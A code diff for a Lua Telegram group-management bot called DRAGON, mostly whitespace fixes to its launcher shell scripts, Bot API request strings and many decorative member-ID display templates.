@@ -87,8 +87,8 @@ file:write([[
 cd $HOME/DRAGON
 token="]]..database:get(id_server..":token")..[["
 while(true) do
-rm -fr../.telegram-cli
-if [ ! -f./tg ]; then
+rm -fr ../.telegram-cli
+if [ ! -f ./tg ]; then
 echo "•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉• ━ ━ ━ ━ ━ ━━ ━ ━ ━ ━ ━ ━"
 echo "TG IS NOT FIND IN FILES BOT"
 echo "•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉• •┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉• ━"
@@ -104,7 +104,7 @@ echo -e "\033[38;5;208m"
 echo -e "                                                  "
 echo -e "\033[0;00m"
 echo -e "\e[36m"
-./tg -s./DRAGON.lua -p PROFILE --bot=$token
+./tg -s ./DRAGON.lua -p PROFILE --bot=$token
 done
 ]])  
 file:close()  
@@ -113,9 +113,9 @@ file:write([[
 #!/usr/bin/env bash
 cd $HOME/DRAGON
 while(true) do
-rm -fr../.telegram-cli
+rm -fr ../.telegram-cli
 screen -S DRAGON -X kill
-screen -S DRAGON./DRAGON
+screen -S DRAGON ./DRAGON
 done
 ]])  
 file:close() 
@@ -497,7 +497,7 @@ function s_api(web)
 local info, res = https.request(web) local req = json:decode(info) if res ~= 200 then return false end if not req.ok then return false end return req 
 end 
 local function sendText(chat_id, text, reply_to_message_id, markdown) 
-send_api = "https://api.telegram.org/bot"..token local url = send_api..'/sendMessage?chat_id='..chat_id..'&text='..URL.escape(text) if reply_to_message_id ~= 0 then url = url..'&reply_to_message_id='..reply_to_message_id  end if markdown == 'md' or markdown == 'markdown' then url = url..'&parse_mode=Markdown' elseif markdown == 'html' then url = url..'&parse_mode=HTML' end return s_api(url)  
+send_api = "https://api.telegram.org/bot"..token local url = send_api..'/sendMessage?chat_id=' .. chat_id .. '&text=' .. URL.escape(text) if reply_to_message_id ~= 0 then url = url .. '&reply_to_message_id=' .. reply_to_message_id  end if markdown == 'md' or markdown == 'markdown' then url = url..'&parse_mode=Markdown' elseif markdown == 'html' then url = url..'&parse_mode=HTML' end return s_api(url)  
 end
 local function Send(chat_id, reply_to_message_id, text)
 local TextParseMode = {ID = "TextParseModeMarkdown"}
@@ -577,7 +577,7 @@ end
 return DRAGON_Msg 
 end
 function Get_Info(msg,chat,user) 
-local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='..chat..'&user_id='..user..'')
+local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. chat ..'&user_id='.. user..'')
 local Json_Info = JSON.decode(Chek_Info)
 if Json_Info.ok == true then
 if Json_Info.result.status == "creator" then
@@ -627,7 +627,7 @@ end
 function GetFile_Bot(msg)
 local list = database:smembers(bot_id..'Chek:Groups') 
 local t = '{"BOT_ID": '..bot_id..',"GP_BOT":{'  
-for k,v in pairs(list) do   ----- kakakak
+for k,v in pairs(list) do   
 NAME = 'DRAGON Chat'
 link = database:get(bot_id.."Private:Group:Link"..msg.chat_id_) or ''
 ASAS = database:smembers(bot_id..'Basic:Constructor'..v)
@@ -708,28 +708,28 @@ file:close()
 return file_path, code 
 end 
 function Addjpg(msg,chat,ID_FILE,File_Name)
-local File = json:decode(https.request('https://api.telegram.org/bot'..token..'/getfile?file_id='..ID_FILE)) 
+local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE)) 
 download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path,File_Name) 
 sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil,'./'..File_Name,'تم تحويل الملصق الى صوره')     
-os.execute('rm -rf./'..File_Name) 
+os.execute('rm -rf ./'..File_Name) 
 end
 function Addvoi(msg,chat,vi,ty)
-local eq = json:decode(https.request('https://api.telegram.org/bot'..token..'/getfile?file_id='..vi)) 
+local eq = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..vi)) 
 download_to_file('https://api.telegram.org/file/bot'..token..'/'..eq.result.file_path,ty) 
 sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, './'..ty)   
-os.execute('rm -rf./'..ty) 
+os.execute('rm -rf ./'..ty) 
 end
 function Addmp3(msg,chat,kkl,ffrr)
-local eer = json:decode(https.request('https://api.telegram.org/bot'..token..'/getfile?file_id='..kkl)) 
+local eer = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..kkl)) 
 download_to_file('https://api.telegram.org/file/bot'..token..'/'..eer.result.file_path,ffrr) 
 sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝙿𝙾𝚆𝙴𝚁.")  
-os.execute('rm -rf./'..ffrr) 
+os.execute('rm -rf ./'..ffrr) 
 end
 function Addsticker(msg,chat,Sd,rre)
-local Qw = json:decode(https.request('https://api.telegram.org/bot'..token..'/getfile?file_id='..Sd)) 
+local Qw = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..Sd)) 
 download_to_file('https://api.telegram.org/file/bot'..token..'/'..Qw.result.file_path,rre) 
 sendSticker(msg.chat_id_, msg.id_, 0, 1, nil, './'..rre)
-os.execute('rm -rf./'..rre) 
+os.execute('rm -rf ./'..rre) 
 end
 function AddFile_Bot(msg,chat,ID_FILE,File_Name)
 if File_Name:match('.json') then
@@ -737,9 +737,9 @@ if tonumber(File_Name:match('(%d+)')) ~= tonumber(bot_id) then
 send(chat,msg.id_," ☉┇  ملف نسخه ليس لهاذا البوت")
 return false 
 end      
-local File = json:decode(https.request('https://api.telegram.org/bot'..token..'/getfile?file_id='..ID_FILE) ) 
+local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE) ) 
 download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path, ''..File_Name) 
-send(chat,msg.id_," ☉┇  جاري...\n ☉┇  رفع الملف الان")
+send(chat,msg.id_," ☉┇  جاري ...\n ☉┇  رفع الملف الان")
 else
 send(chat,msg.id_,"* ☉┇ عذرا الملف ليس بصيغة {JSON} يرجى رفع الملف الصحيح*")
 end      
@@ -810,7 +810,7 @@ msgm = msgm - 1048576
 end
 end 
 if type == 'keed' then
-https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_.."") 
+https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..msg.sender_user_id_.."") 
 database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_) 
 msgm = msg.id_
 my_ide = msg.sender_user_id_
@@ -875,10 +875,10 @@ else
 Chat_Type = 'GroupBot' 
 end
 end
-if database:get(bot_id.."Bc:Grops:Pin"..msg.chat_id_..":"..msg.sender_user_id_) then 
+if database:get(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
 if text == "الغاء" or text == "الغاء ☉" then   
 send(msg.chat_id_, msg.id_," ☉┇ تم الغاء الاذاعه")
-database:del(bot_id.."Bc:Grops:Pin"..msg.chat_id_..":"..msg.sender_user_id_) 
+database:del(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
 return false
 end 
 local list = database:smembers(bot_id.."Chek:Groups") 
@@ -909,7 +909,7 @@ database:set(bot_id..'Msg:Pin:Chat'..v,msg.content_.sticker_.sticker_.persistent
 end 
 end
 send(msg.chat_id_, msg.id_," ☉┇ تمت الاذاعه الى *~ "..#list.." ~* جروب ")
-database:del(bot_id.."Bc:Grops:Pin"..msg.chat_id_..":"..msg.sender_user_id_) 
+database:del(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
 return false
 end
 --------------------------------------------------------------------------------------------------------------
@@ -1173,10 +1173,10 @@ local List = {
 ⌯  𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
-𓅓➪:ᗰᔕᘜᔕ : #msgs - ❦.
-𓅓➪ : Iᗪ : #id - ❦.
-𓅓➪ : ᔕTᗩᔕT : #stast - ❦.
-𓅓➪ : ᑌᔕᖇᗴᑎᗩᗰᗴ : #username _ ❦.
+𓅓➪:ᗰᔕᘜᔕ : #msgs - ❦ .
+𓅓➪ : Iᗪ : #id - ❦ . 
+𓅓➪ : ᔕTᗩᔕT : #stast - ❦ . 
+𓅓➪ : ᑌᔕᖇᗴᑎᗩᗰᗴ : #username _ ❦ .
 𓅓➪ : 𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
@@ -1188,10 +1188,10 @@ local List = {
 - 𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
-𓁷⁦⁦ - 𝙪𝙚𝙨 †: #username 𓀀.
-𓁷 - 𝙢𝙨𝙜 † : #msgs 𓀀.
-𓁷 - 𝙨𝙩𝙖 †: #stast 𓀀 .
-𓁷 - 𝙞𝙙 †: #id 𓀀.
+𓁷⁦⁦ - 𝙪𝙚𝙨 †: #username 𓀀 .
+𓁷 - 𝙢𝙨𝙜 † : #msgs 𓀀 .
+𓁷 - 𝙨𝙩𝙖 †: #stast 𓀀  .
+𓁷 - 𝙞𝙙 †: #id 𓀀 .
 𓁷 - 𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
@@ -1227,11 +1227,11 @@ local List = {
 ► 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
--›   𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴.#username 🇪🇬 ꙰ 
--›   𝚂𝚃𝙰𝚂𝚃.#stast 🇪🇬 ꙰
--›   𝙸𝙳.#id 🇪🇬 ꙰ 
--›   𝙶𝙼𝙰𝚂.#stast 🇪🇬 ꙰ 
--›   𝙼𝚂𝙶𝚂.#msgs 🇪🇬 ꙰
+-›   𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 . #username 🇪🇬 ꙰ 
+-›   𝚂𝚃𝙰𝚂𝚃 . #stast 🇪🇬 ꙰
+-›   𝙸𝙳 . #id 🇪🇬 ꙰ 
+-›   𝙶𝙼𝙰𝚂 . #stast 🇪🇬 ꙰ 
+-›   𝙼𝚂𝙶𝚂 . #msgs 🇪🇬 ꙰
 -›   𝗖𝗛 - @SOPOWERB0T 🇪🇬 ꙰.
 ]],
 [[
@@ -1246,15 +1246,15 @@ local List = {
 🇪🇬 - 𝚄𝚂𝙴𝚁 ⟿ #username 💘.
 🇪🇬 - 𝙼𝚂𝙶𝚂 ⟿  #msgs 💘.
 🇪🇬 - 𝙶𝙼𝙰𝚂 ⟿ #stast 💘.
-🇪🇬 - 𝙸𝙳 𝚂𝚃𝙰 ⟿ #id 💘. 
+🇪🇬 - 𝙸𝙳 𝚂𝚃𝙰 ⟿ #id 💘.  
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
 🇪🇬 - 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
-- 𓏬 𝐔𝐬𝐄𝐫 : #username 𓂅.
-- 𓏬 𝐌𝐬𝐆  : #msgs 𓂅.
-- 𓏬 𝐒𝐭𝐀 : #stast 𓂅.
-- 𓏬 𝐈𝐃 : #id 𓂅.
+- 𓏬 𝐔𝐬𝐄𝐫 : #username 𓂅 .
+- 𓏬 𝐌𝐬𝐆  : #msgs 𓂅 .
+- 𓏬 𝐒𝐭𝐀 : #stast 𓂅 .
+- 𓏬 𝐈𝐃 : #id 𓂅 .
 - 𓏬 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
@@ -1273,10 +1273,10 @@ local List = {
 🦅•𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
-- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username.
-- ᴍѕɢѕ ➣ #msgs.
-- ѕᴛᴀᴛѕ ➣ #stast.
-- ʏᴏᴜʀ ɪᴅ ➣ #id .
+- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username .
+- ᴍѕɢѕ ➣ #msgs .
+- ѕᴛᴀᴛѕ ➣ #stast .
+- ʏᴏᴜʀ ɪᴅ ➣ #id  .
 - 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
@@ -1332,26 +1332,26 @@ local List = {
 ➞: 𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
-➼ : 𝐼𝐷 𖠀 #id.♡
-➼ : 𝑈𝑆𝐸𝑅 𖠀 #username.♡
-➼ : 𝑀𝑆𝐺𝑆 𖠀 #msgs.♡
-➼ : 𝑆𝑇𝐴S𝑇 𖠀 #stast.♡ 
-➼ : 𝐸𝐷𝐼𝑇  𖠀 #edit.♡
+➼ : 𝐼𝐷 𖠀 #id . ♡
+➼ : 𝑈𝑆𝐸𝑅 𖠀 #username .♡
+➼ : 𝑀𝑆𝐺𝑆 𖠀 #msgs .♡
+➼ : 𝑆𝑇𝐴S𝑇 𖠀 #stast .♡ 
+➼ : 𝐸𝐷𝐼𝑇  𖠀 #edit .♡
 ➼ : 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
-▽ ¦☉┇• USER ➭ ⁞ #username.
-▽ ¦☉┇• 𝙼𝚂𝙶𝚂 ➬ ⁞  #msgs .
-▽ ¦☉┇• STAT ➬ ⁞ #stast .
-▽ ¦☉┇• 𝙸𝙳  ➬ ⁞ #id .
-▽ ¦☉┇• 𝗖𝗛 - @SOPOWERB0T 🦅.
+▽ ¦❀• USER ➭ ⁞ #username .
+▽ ¦❀• 𝙼𝚂𝙶𝚂 ➬ ⁞  #msgs  .
+▽ ¦❀• STAT ➬ ⁞ #stast  .
+▽ ¦❀• 𝙸𝙳  ➬ ⁞ #id  .
+▽ ¦❀• 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
 • ❉ 𝑼𝑬𝑺 : #username ‌‌‏.
-• ❉ 𝑺𝑻𝑨 : #stast.
+• ❉ 𝑺𝑻𝑨 : #stast .
 • ❉ 𝑰𝑫 : #id  ‌‌‏.
 • ❉  𝑴𝑺𝑮 : #msgs 𓆊.
-• ❉ 𝑾𝒆𝒍𝒄𝒐𝒎𝒆  ⁞.
+• ❉ 𝑾𝒆𝒍𝒄𝒐𝒎𝒆  ⁞ .
 • ❉ 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
@@ -1385,10 +1385,10 @@ local List = {
 🦅 - 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
-- 𝄬 username.#username ➪🇪🇬
- - 𝄬 stast.#stast ➪🇪🇬
- - 𝄬 id.#id ➪🇪🇬
- - 𝄬 msgs.#msgs ➪🇪🇬
+- 𝄬 username . #username ➪🇪🇬
+ - 𝄬 stast . #stast ➪🇪🇬
+ - 𝄬 id . #id ➪🇪🇬
+ - 𝄬 msgs . #msgs ➪🇪🇬
  - 𝄬 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
@@ -1413,7 +1413,7 @@ local List = {
 ➫✿: 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
-✶- 𝒔𝒕𝒂𓂅 #stast 𓍯↝❃.
+✶- 𝒔𝒕𝒂𓂅 #stast 𓍯↝❃ .
 ✶- 𝒖𝒔𝒆𝒓𓂅 #username 𓍯↝❃.
 ✶- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯↝❃.
 ✶- 𝒊𝒅 𓂅 #id 𓍯↝❃.
@@ -1438,13 +1438,13 @@ local List = {
 • 𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
-- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username.
-- ᴍѕɢѕ ➣ #msgs.
-- ѕᴛᴀᴛѕ ➣ #stast.
-- ʏᴏᴜʀ ɪᴅ ➣ #id .
-- ᴇᴅɪᴛ ᴍsɢ ➣ #edit.
-- ᴅᴇᴛᴀɪʟs ➣ #auto.
--  ɢᴀᴍᴇ ➣ #game.
+- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username .
+- ᴍѕɢѕ ➣ #msgs .
+- ѕᴛᴀᴛѕ ➣ #stast .
+- ʏᴏᴜʀ ɪᴅ ➣ #id  .
+- ᴇᴅɪᴛ ᴍsɢ ➣ #edit .
+- ᴅᴇᴛᴀɪʟs ➣ #auto . 
+-  ɢᴀᴍᴇ ➣ #game .
 - 𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
@@ -1523,19 +1523,19 @@ local List = {
 ‌‎⿻┊‌‎𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
-⌾ | 𝒊𝒅  𓃠 #id.
-⌾ | 𝒖𝒔𝒆𝒓 𓃠 #username.
-⌾ | 𝒎𝒔𝒈𝒔 𓃠 #msgs.
-⌾ | 𝒔𝒕𝒂𝒕𝒔 𓃠 #stast.
-⌾ | 𝒆𝒅𝒊𝒕 𓃠 #edit.
+⌾ | 𝒊𝒅  𓃠 #id .
+⌾ | 𝒖𝒔𝒆𝒓 𓃠 #username .
+⌾ | 𝒎𝒔𝒈𝒔 𓃠 #msgs .
+⌾ | 𝒔𝒕𝒂𝒕𝒔 𓃠 #stast .
+⌾ | 𝒆𝒅𝒊𝒕 𓃠 #edit .
 ⌾ | 𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
-♡ : 𝐼𝐷 𖠀 #id.
-♡ : 𝑈𝑆𝐸𝑅 𖠀 #username.
-♡ : 𝑀𝑆𝐺𝑆 𖠀 #msgs.
-♡ : 𝑆𝑇𝐴𝑇𝑆 𖠀 #stast.
-♡ : 𝐸𝐷𝐼𝑇  𖠀 #edit.
+♡ : 𝐼𝐷 𖠀 #id .
+♡ : 𝑈𝑆𝐸𝑅 𖠀 #username .
+♡ : 𝑀𝑆𝐺𝑆 𖠀 #msgs .
+♡ : 𝑆𝑇𝐴𝑇𝑆 𖠀 #stast .
+♡ : 𝐸𝐷𝐼𝑇  𖠀 #edit .
 ♡ : 𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
@@ -1546,10 +1546,10 @@ local List = {
 •𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
-• USE ➤ #username .
-• MSG ➤  #msgs .
-• STA ➤  #stast .
-• iD ➤ #id .
+• USE ➤ #username  .
+• MSG ➤  #msgs  .
+• STA ➤  #stast  .
+• iD ➤ #id  .
 • 𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
@@ -1574,18 +1574,18 @@ local List = {
 • 🇪🇬 - 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
-• USE ➤  #username.
-• MSG ➤  #msgs.
-• STA ➤  #stast.
-• iD ➤ #id.
+• USE ➤  #username .
+• MSG ➤  #msgs .
+• STA ➤  #stast .
+• iD ➤ #id .
 • 𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
-🇪🇬 - 𝄬 𝐔ˢᴱᴿᴺᴬᴹᴱ.#username  𓃠
-🇪🇬 - 𝄬 ˢᵀᴬˢᵀ.#stast  𓃠
-🇪🇬 - 𝄬 ᴵᴰ.#id 𓃠
-🇪🇬 - 𝄬 ᴳᴹᴬˢ.#gmas 𓃠
-🇪🇬 - 𝄬 ᴹˢᴳˢ.#msgs  𓃠
+🇪🇬 - 𝄬 𝐔ˢᴱᴿᴺᴬᴹᴱ . #username  𓃠
+🇪🇬 - 𝄬 ˢᵀᴬˢᵀ . #stast  𓃠
+🇪🇬 - 𝄬 ᴵᴰ . #id 𓃠
+🇪🇬 - 𝄬 ᴳᴹᴬˢ . #gmas 𓃠
+🇪🇬 - 𝄬 ᴹˢᴳˢ . #msgs  𓃠
 🇪🇬 - 𝄬 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
@@ -1604,27 +1604,27 @@ Msᴀɢ ~ #msgs
 𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
-- 🇪🇬 UsErNaMe.#username 𖠲
-- 🇪🇬 StAsT.#stast 𖠲
-- 🇪🇬 Id.#id 𖠲
-- 🇪🇬 GaMeS.#game 𖠲
-- 🇪🇬 MsGs.#msgs 𖠲
+- 🇪🇬 UsErNaMe . #username 𖠲
+- 🇪🇬 StAsT . #stast 𖠲
+- 🇪🇬 Id . #id 𖠲
+- 🇪🇬 GaMeS . #game 𖠲
+- 🇪🇬 MsGs . #msgs 𖠲
 - 🇪🇬 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
-🇪🇬 - 𝄬 username.#username  𓃠
-🇪🇬 - 𝄬 stast.#stast  𓃠
-🇪🇬 - 𝄬 id.#id 𓃠
-🇪🇬 - 𝄬 gmas.#gmas 𓃠
-🇪🇬 - 𝄬 msgs.#msgs  𓃠
+🇪🇬 - 𝄬 username . #username  𓃠
+🇪🇬 - 𝄬 stast . #stast  𓃠
+🇪🇬 - 𝄬 id . #id 𓃠
+🇪🇬 - 𝄬 gmas . #gmas 𓃠
+🇪🇬 - 𝄬 msgs . #msgs  𓃠
 🇪🇬 - 𝄬 𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
-金 - 𝓾𝓼𝓮𝓻𝓷𝓪𝓶𝓮.#username ⸙ 
-金 - 𝓼𝓽𝓪𝓼𝓽 .#stast ⸙ 
-金 - 𝓲𝓭.#id ⸙ 
-金 - 𝓰𝓶𝓪𝓼.#gmas ⸙ 
-金 - 𝓶𝓼𝓰𝓼.#msgs ⸙
+金 - 𝓾𝓼𝓮𝓻𝓷𝓪𝓶𝓮 . #username ⸙ 
+金 - 𝓼𝓽𝓪𝓼𝓽  . #stast ⸙ 
+金 - 𝓲𝓭 . #id ⸙ 
+金 - 𝓰𝓶𝓪𝓼 . #gmas ⸙ 
+金 - 𝓶𝓼𝓰𝓼 . #msgs ⸙
 金 - 𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
@@ -1649,19 +1649,19 @@ Msᴀɢ ~ #msgs
 𓂅 𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
-- 🇪🇬 𝒖𝒔𝒆𝒓𝒏𝒂𝒎𝒆.#username 𖣂.
-- 🇪🇬 𝒔𝒕𝒂𝒔𝒕.#stast 𖣂.
-- 🇪🇬 𝒊𝒅.#id 𖣂.
-- 🇪🇬 𝒈𝒂𝒎𝒆𝒔.#game 𖣂.
-- 🇪🇬 𝒎𝒔𝒈𝒔.#msgs 𖣂.
+- 🇪🇬 𝒖𝒔𝒆𝒓𝒏𝒂𝒎𝒆 . #username 𖣂.
+- 🇪🇬 𝒔𝒕𝒂𝒔𝒕 . #stast 𖣂.
+- 🇪🇬 𝒊𝒅 . #id 𖣂.
+- 🇪🇬 𝒈𝒂𝒎𝒆𝒔 . #game 𖣂.
+- 🇪🇬 𝒎𝒔𝒈𝒔 . #msgs 𖣂.
 - 🇪🇬 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
-ᯓ 𝗨𝗦𝗘𝗥𝗡𝗮𝗺𝗘.#username 🇪🇬 ꙰
-ᯓ 𝗦𝗧𝗮𝗦𝗧.#stast 🇪🇬 ꙰
-ᯓ 𝗜𝗗.#id 🇪🇬 ꙰
-ᯓ 𝗚𝗮𝗺𝗘𝗦.#game 🇪🇬 ꙰
-ᯓ 𝗺𝗦𝗚𝗦.#msgs 🇪🇬 ꙰
+ᯓ 𝗨𝗦𝗘𝗥𝗡𝗮𝗺𝗘 . #username 🇪🇬 ꙰
+ᯓ 𝗦𝗧𝗮𝗦𝗧 . #stast 🇪🇬 ꙰
+ᯓ 𝗜𝗗 . #id 🇪🇬 ꙰
+ᯓ 𝗚𝗮𝗺𝗘𝗦 . #game 🇪🇬 ꙰
+ᯓ 𝗺𝗦𝗚𝗦 . #msgs 🇪🇬 ꙰
 ᯓ 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
@@ -1680,18 +1680,18 @@ Msᴀɢ ~ #msgs
 ➥• 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
-👳🏼‍♂ - 𝄬 username.#username.🇪🇬
-👳🏼‍♂ - 𝄬 stast.#stast.🇪🇬
-👳🏼‍♂ - 𝄬 id.#id.🇪🇬
-👳🏼‍♂ - 𝄬 auto.#auto.🇪🇬
-👳🏼‍♂ - 𝄬 msgs.#msgs.🇪🇬
+👳🏼‍♂ - 𝄬 username . #username . 🇪🇬
+👳🏼‍♂ - 𝄬 stast . #stast . 🇪🇬
+👳🏼‍♂ - 𝄬 id . #id . 🇪🇬
+👳🏼‍♂ - 𝄬 auto . #auto . 🇪🇬
+👳🏼‍♂ - 𝄬 msgs . #msgs . 🇪🇬
 👳🏼‍♂ - 𝄬 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
-➭- 𝒔𝒕𝒂𓂅 #stast 𓍯.💕
-➮- 𝒖𝒔𝒆𝒓𓂅 #username 𓍯.💕
-➭- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯.💕
-➭- 𝒊𝒅 𓂅 #id 𓍯.💕
+➭- 𝒔𝒕𝒂𓂅 #stast 𓍯. 💕
+➮- 𝒖𝒔𝒆𝒓𓂅 #username 𓍯. 💕
+➭- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯. 💕
+➭- 𝒊𝒅 𓂅 #id 𓍯. 💕
 ➭- 𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
@@ -1703,12 +1703,12 @@ Msᴀɢ ~ #msgs
 𓄼 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
-𝐓𝐓• 𝐘𝐎𝐔𝐑 𝐈𝐃 𖠰 #id.
-𝐓𝐓• 𝐌𝐒𝐆𝐒 𖠰 #msgs.
-𝐓𝐓• 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 𖠰 #username.
-𝐓𝐓• 𝐒𝐓𝐀𝐒𝐓 𖠰 #stast.
-𝐓𝐓• 𝐀𝐔𝐓𝐎 𖠰 #auto.
-𝐓𝐓• 𝗘𝗗𝗜𝗧 𖠰 #edit.
+𝐓𝐓• 𝐘𝐎𝐔𝐑 𝐈𝐃 𖠰 #id .
+𝐓𝐓• 𝐌𝐒𝐆𝐒 𖠰 #msgs .
+𝐓𝐓• 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 𖠰 #username .
+𝐓𝐓• 𝐒𝐓𝐀𝐒𝐓 𖠰 #stast .
+𝐓𝐓• 𝐀𝐔𝐓𝐎 𖠰 #auto .
+𝐓𝐓• 𝗘𝗗𝗜𝗧 𖠰 #edit .
 𝐓𝐓• 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
@@ -1772,10 +1772,10 @@ Msᴀɢ ~ #msgs
 ⌯  𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-𓅓➪:ᗰᔕᘜᔕ : #msgs - ❦.
-𓅓➪ : Iᗪ : #id - ❦.
-𓅓➪ : ᔕTᗩᔕT : #stast - ❦.
-𓅓➪ : ᑌᔕᖇᗴᑎᗩᗰᗴ : #username _ ❦.
+𓅓➪:ᗰᔕᘜᔕ : #msgs - ❦ .
+𓅓➪ : Iᗪ : #id - ❦ . 
+𓅓➪ : ᔕTᗩᔕT : #stast - ❦ . 
+𓅓➪ : ᑌᔕᖇᗴᑎᗩᗰᗴ : #username _ ❦ .
 𓅓➪ : 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
@@ -1787,10 +1787,10 @@ Msᴀɢ ~ #msgs
 - 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-𓁷⁦⁦ - 𝙪𝙚𝙨 †: #username 𓀀.
-𓁷 - 𝙢𝙨𝙜 † : #msgs 𓀀.
-𓁷 - 𝙨𝙩𝙖 †: #stast 𓀀 .
-𓁷 - 𝙞𝙙 †: #id 𓀀.
+𓁷⁦⁦ - 𝙪𝙚𝙨 †: #username 𓀀 .
+𓁷 - 𝙢𝙨𝙜 † : #msgs 𓀀 .
+𓁷 - 𝙨𝙩𝙖 †: #stast 𓀀  .
+𓁷 - 𝙞𝙙 †: #id 𓀀 .
 𓁷 - 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
@@ -1810,11 +1810,11 @@ Msᴀɢ ~ #msgs
 𖤂 ~ 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
--›   𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴.#username 🇪🇬 ꙰ 
--›   𝚂𝚃𝙰𝚂𝚃.#stast 🇪🇬 ꙰
--›   𝙸𝙳.#id 🇪🇬 ꙰ 
--›   𝙶𝙼𝙰𝚂.#stast 🇪🇬 ꙰ 
--›   𝙼𝚂𝙶𝚂.#msgs 🇪🇬 ꙰
+-›   𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 . #username 🇪🇬 ꙰ 
+-›   𝚂𝚃𝙰𝚂𝚃 . #stast 🇪🇬 ꙰
+-›   𝙸𝙳 . #id 🇪🇬 ꙰ 
+-›   𝙶𝙼𝙰𝚂 . #stast 🇪🇬 ꙰ 
+-›   𝙼𝚂𝙶𝚂 . #msgs 🇪🇬 ꙰
 -›   𝗖𝗛 - @SOPOWERB0T 🇪🇬 ꙰.
 ]],
 [[
@@ -1845,15 +1845,15 @@ Msᴀɢ ~ #msgs
 🇪🇬 - 𝚄𝚂𝙴𝚁 ⟿ #username 💘.
 🇪🇬 - 𝙼𝚂𝙶𝚂 ⟿  #msgs 💘.
 🇪🇬 - 𝙶𝙼𝙰𝚂 ⟿ #stast 💘.
-🇪🇬 - 𝙸𝙳 𝚂𝚃𝙰 ⟿ #id 💘. 
